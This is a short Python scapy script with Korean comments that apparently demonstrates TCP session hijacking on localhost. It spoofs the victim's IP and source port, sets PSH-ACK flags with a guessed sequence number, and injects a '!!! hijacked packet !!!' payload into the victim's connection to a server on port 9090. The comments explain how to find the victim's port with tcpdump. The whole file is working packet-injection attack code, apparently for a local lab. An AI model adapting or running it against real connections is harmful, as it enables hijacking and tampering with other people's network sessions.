from scapy.all import *

# 📍 victim이 서버에 연결한 실제 포트를 알아야 합니다.
# 먼저 server.py에 victim이 연결하면, 'tcpdump'로 포트 확인하세요:
# sudo tcpdump -i lo0 tcp port 9090

victim_ip = "127.0.0.1"
server_ip = "127.0.0.1"
victim_port = 59499  # 여기에 실제 victim source port를 넣으세요
server_port = 9090

# 임의 시퀀스 번호 (정확해야 성공하지만 테스트용으로는 대략 가능)
seq = 36
ack = 1

# 위조된 패킷 생성
pkt = IP(src=victim_ip, dst=server_ip) / \
      TCP(sport=victim_port, dport=server_port, flags="PA", seq=seq, ack=ack) / \
      Raw(load="!!! hijacked packet !!!\n")

# 전송
send(pkt, verbose=0)
print("🚨 위조된 패킷 전송 완료.")